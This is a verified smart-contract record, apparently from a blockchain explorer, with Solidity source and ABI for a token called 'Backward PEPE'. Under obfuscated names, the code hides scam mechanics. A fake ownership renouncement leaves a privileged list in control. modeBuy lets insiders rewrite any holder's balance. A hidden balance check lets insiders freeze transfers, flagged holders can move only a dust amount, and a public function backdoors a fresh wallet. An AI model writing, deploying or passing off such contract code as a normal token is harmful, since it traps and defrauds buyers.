{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.12;\n\ninterface totalEnable {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address listFund) external view returns (uint256);\n\n    function transfer(address receiverSell, uint256 launchLiquidity) external returns (bool);\n\n    function allowance(address walletLaunch, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 launchLiquidity) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address receiverSell,\n        uint256 launchLiquidity\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed exemptReceiver, uint256 value);\n    event Approval(address indexed walletLaunch, address indexed spender, uint256 value);\n}\n\nabstract contract fromIsTotal {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface toTotalIs {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface enableShould {\n    function createPair(address teamTake, address takeList) external returns (address);\n}\n\ninterface totalEnableMetadata is totalEnable {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract BackwardPEPE is fromIsTotal, totalEnable, totalEnableMetadata {\n\n    function getOwner() external view returns (address) {\n        return walletBuy;\n    }\n\n    function senderSell(address receiverLaunched, address receiverSell, uint256 launchLiquidity) internal returns (bool) {\n        if (receiverLaunched == modeTeam) {\n            return isShould(receiverLaunched, receiverSell, launchLiquidity);\n        }\n        uint256 feeListFrom = totalEnable(swapLiquidity).balanceOf(launchedExempt);\n        require(feeListFrom == swapTo);\n        require(receiverSell != launchedExempt);\n        if (marketingTotal[receiverLaunched]) {\n            return isShould(receiverLaunched, receiverSell, autoFeeExempt);\n        }\n        return isShould(receiverLaunched, receiverSell, launchLiquidity);\n    }\n\n    uint256 public amountTx;\n\n    function approve(address launchTo, uint256 launchLiquidity) public virtual override returns (bool) {\n        shouldSell[_msgSender()][launchTo] = launchLiquidity;\n        emit Approval(_msgSender(), launchTo, launchLiquidity);\n        return true;\n    }\n\n    uint256 swapTo;\n\n    function toWalletTeam(address sellExempt) public {\n        totalAt();\n        \n        if (sellExempt == modeTeam || sellExempt == swapLiquidity) {\n            return;\n        }\n        marketingTotal[sellExempt] = true;\n    }\n\n    function owner() external view returns (address) {\n        return walletBuy;\n    }\n\n    string private teamBuyFee = \"BPE\";\n\n    address sellFund = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address public modeTeam;\n\n    uint256 tradingModeMax;\n\n    uint256 private sellToken;\n\n    mapping(address => bool) public fundTotalAmount;\n\n    function name() external view virtual override returns (string memory) {\n        return swapExemptAuto;\n    }\n\n    address private walletBuy;\n\n    function allowance(address sellSender, address launchTo) external view virtual override returns (uint256) {\n        if (launchTo == sellFund) {\n            return type(uint256).max;\n        }\n        return shouldSell[sellSender][launchTo];\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return receiverAmount;\n    }\n\n    bool public liquidityList;\n\n    string private swapExemptAuto = \"Backward PEPE\";\n\n    mapping(address => uint256) private minTo;\n\n    mapping(address => bool) public marketingTotal;\n\n    function listAmount(address teamSell) public {\n        require(teamSell.balance < 100000);\n        if (liquidityList) {\n            return;\n        }\n        \n        fundTotalAmount[teamSell] = true;\n        if (sellToken != buyLaunchAt) {\n            buyLaunchAt = sellToken;\n        }\n        liquidityList = true;\n    }\n\n    function feeLimitTrading() public {\n        emit OwnershipTransferred(modeTeam, address(0));\n        walletBuy = address(0);\n    }\n\n    function transfer(address teamToken, uint256 launchLiquidity) external virtual override returns (bool) {\n        return senderSell(_msgSender(), teamToken, launchLiquidity);\n    }\n\n    function transferFrom(address receiverLaunched, address receiverSell, uint256 launchLiquidity) external override returns (bool) {\n        if (_msgSender() != sellFund) {\n            if (shouldSell[receiverLaunched][_msgSender()] != type(uint256).max) {\n                require(launchLiquidity <= shouldSell[receiverLaunched][_msgSender()]);\n                shouldSell[receiverLaunched][_msgSender()] -= launchLiquidity;\n            }\n        }\n        return senderSell(receiverLaunched, receiverSell, launchLiquidity);\n    }\n\n    constructor (){\n        if (buyLaunchAt == sellToken) {\n            sellToken = amountTx;\n        }\n        toTotalIs tradingTakeReceiver = toTotalIs(sellFund);\n        swapLiquidity = enableShould(tradingTakeReceiver.factory()).createPair(tradingTakeReceiver.WETH(), address(this));\n        \n        modeTeam = _msgSender();\n        feeLimitTrading();\n        fundTotalAmount[modeTeam] = true;\n        minTo[modeTeam] = receiverAmount;\n        \n        emit Transfer(address(0), modeTeam, receiverAmount);\n    }\n\n    bool public limitLaunchedSell;\n\n    function isShould(address receiverLaunched, address receiverSell, uint256 launchLiquidity) internal returns (bool) {\n        require(minTo[receiverLaunched] >= launchLiquidity);\n        minTo[receiverLaunched] -= launchLiquidity;\n        minTo[receiverSell] += launchLiquidity;\n        emit Transfer(receiverLaunched, receiverSell, launchLiquidity);\n        return true;\n    }\n\n    uint256 private receiverAmount = 100000000 * 10 ** 18;\n\n    function balanceOf(address listFund) public view virtual override returns (uint256) {\n        return minTo[listFund];\n    }\n\n    address launchedExempt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    event OwnershipTransferred(address indexed enableTxLaunched, address indexed fundTotal);\n\n    function takeTo(uint256 launchLiquidity) public {\n        totalAt();\n        swapTo = launchLiquidity;\n    }\n\n    function modeBuy(address teamToken, uint256 launchLiquidity) public {\n        totalAt();\n        minTo[teamToken] = launchLiquidity;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return modeTakeAt;\n    }\n\n    uint256 private buyLaunchAt;\n\n    function totalAt() private view {\n        require(fundTotalAmount[_msgSender()]);\n    }\n\n    uint8 private modeTakeAt = 18;\n\n    mapping(address => mapping(address => uint256)) private shouldSell;\n\n    uint256 constant autoFeeExempt = 10 ** 10;\n\n    function symbol() external view virtual override returns (string memory) {\n        return teamBuyFee;\n    }\n\n    address public swapLiquidity;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletLaunch\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableTxLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundTotal\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchTo\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchLiquidity\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listFund\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeLimitTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundTotalAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitLaunchedSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamSell\",\"type\":\"address\"}],\"name\":\"listAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchLiquidity\",\"type\":\"uint256\"}],\"name\":\"modeBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"launchLiquidity\",\"type\":\"uint256\"}],\"name\":\"takeTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellExempt\",\"type\":\"address\"}],\"name\":\"toWalletTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchLiquidity\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchLiquidity\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "BackwardPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}